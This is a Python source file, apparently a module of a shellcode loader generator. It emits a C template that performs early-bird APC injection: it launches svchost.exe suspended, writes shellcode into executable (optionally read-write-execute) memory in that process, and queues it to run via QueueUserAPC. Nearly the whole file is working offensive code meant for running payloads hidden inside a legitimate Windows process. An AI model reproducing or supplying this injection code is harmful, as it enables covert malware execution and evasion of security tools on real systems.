from string import Template

class queueuserapc:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                "#include <winternl.h>"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """"""

    def template(self) -> str:
        return Template("""
    {transformers}
    
    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    PPEB pPeb;
    PVOID pImage, pEntry;
    PIMAGE_NT_HEADERS pNtHeaders;
    LONG e_lfanew;
    SIZE_T NumberOfBytesRead;
    DWORD AddressOfEntryPoint;

    CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
    WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
    
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pRemoteCode;

    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, (ULONG_PTR)NULL);

    ResumeThread(pi.hThread);
""").substitute(target=self.target, memoryPermission=self.memoryPermission)